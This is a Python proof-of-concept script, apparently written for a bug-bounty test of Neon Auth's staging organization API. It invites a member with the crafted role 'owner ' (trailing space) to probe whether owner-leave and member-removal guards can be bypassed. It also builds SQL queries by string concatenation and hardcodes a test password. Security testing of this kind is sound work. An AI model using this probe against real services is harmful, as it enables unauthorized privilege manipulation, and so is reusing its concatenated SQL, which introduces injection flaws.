# -*- coding: utf-8 -*-
"""V9e: R1 (owner removes ghost) + R5 (owner leave guard with ghost present)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V9e ghost remove/leave guard ==")
    fetch_db_uri()
    c1, c2 = auth(U1), auth(U2)
    out("sessions: %s" % [bool(c1), bool(c2)])
    if not (c1 and c2):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v9e-org", "slug": "v9e-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    def invite_accept(email, role, ck):
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                      {"organizationId": org, "email": email, "role": role}, c1)
        if st != 200:
            out("  invite %s as %r failed %d" % (email, role, st))
            return None
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                'AND status=%s' % ("'" + org + "'", "'" + email + "'", "'pending'"))
        iid = str(r[0][0]) if r else None
        if iid:
            st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                          {"invitationId": iid}, ck)
            out("  %s accepted as %r -> %d" % (email, role, st))
        return iid

    invite_accept(U2, "owner ", c2)
    out("   members: %s" % [(x[0], repr(x[1])) for x in dbq(
        'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
        'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])

    # R5: owner leave while ghost 'owner ' present
    st, d, _ = na("POST", "/neondb/auth/organization/leave",
                  {"organizationId": org}, c1)
    out("R5 owner leave w/ ghost      -> %d %s" % (st, d[:120]))
    # R1: owner removes ghost
    m2 = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
             'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + U2 + "'"))
    if m2:
        st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                      {"organizationId": org, "memberIdOrEmail": str(m2[0][0])}, c1)
        out("R1 owner removes ghost      -> %d %s" % (st, d[:120]))
    out("   members: %s" % [(x[0], repr(x[1])) for x in dbq(
        'SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
        'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))])
    # cleanup
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
    out("cleanup delete org -> %d" % st)
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
